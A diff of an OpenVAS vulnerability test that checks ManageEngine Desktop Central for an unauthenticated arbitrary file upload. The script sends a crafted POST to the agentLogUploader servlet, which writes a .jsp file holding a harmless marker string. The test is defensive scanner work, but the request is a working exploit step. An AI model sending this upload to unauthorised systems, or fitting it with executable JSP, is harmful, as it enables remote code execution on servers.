@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_manageengine_desktopcentral_file_upload_vuln.nasl 11883 2018-10-12 13:31:09Z cfischer $
+# $Id: gb_manageengine_desktopcentral_file_upload_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # ManageEngine Desktop Central Arbitrary File Upload Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:zohocorp:manageengine_desktop_central";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803777");
-  script_version("$Revision: 11883 $");
+  script_version("$Revision: 13994 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-12 15:31:09 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2013-11-20 12:28:14 +0530 (Wed, 20 Nov 2013)");
   script_name("ManageEngine Desktop Central Arbitrary File Upload Vulnerability");
   script_category(ACT_ATTACK);
@@ -48,13 +48,17 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow an attacker to gain arbitrary code
   execution on the server.");
+
   script_tag(name:"affected", value:"ManageEngine Desktop Central 8.0.0 (build 80293 and below)");
+
   script_tag(name:"insight", value:"The flaw in the AgentLogUploadServlet. This servlet takes input from HTTP
-  POST and constructs an output file on the server without performing any
-  sanitisation or even checking if the caller is authenticated.");
+  POST and constructs an output file on the server without performing any sanitisation or even checking if the caller is authenticated.");
+
   script_tag(name:"solution", value:"Apply the patch supplied by the vendor (Patch 80293)");
+
   script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP POST request and check whether it
   is able to create the file or not.");
+
   script_tag(name:"summary", value:"This host is running ManageEngine Desktop Central and is prone to arbitrary
   file upload vulnerability.");
 
@@ -69,27 +73,29 @@ include("http_keepalive.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
-if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+if( ! port = get_app_port( cpe:CPE ) )
+  exit( 0 );
 
-if( dir == "/" ) dir = "";
+if( ! dir = get_app_location( cpe:CPE, port:port ) )
+  exit( 0 );
+
+if( dir == "/" )
+  dir = "";
 
 host = http_host_name( port:port );
-vtstring = get_vt_string( lowercase:TRUE );
+vtstrings = get_vt_strings();
+vtstring = vtstrings["default"];
 
 postdata = "This file is uploaded by a " + vtstring + " for vulnerability testing";
 
-file = vtstring + '_' + rand() + '.jsp';
+file = vtstrings["lowercase_rand"] + '.jsp';
 
-url = dir + "/agentLogUploader?computerName=DesktopCentral&domainName=webapps&custom" +
-            "erId=1&filename=" + file;
-
+url = dir + "/agentLogUploader?computerName=DesktopCentral&domainName=webapps&customerId=1&filename=" + file;
 sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Content-Type: text/html;\r\n",
                  "Content-Length: ", strlen( postdata ), "\r\n",
                  "\r\n", postdata );
-## Send post request and Receive the response
 rcvRes = http_keepalive_send_recv( port:port, data:sndReq );
 
 if( rcvRes && rcvRes =~ "^HTTP/1\.[01] 200" && "X-dc-header: yes" >< rcvRes ) {
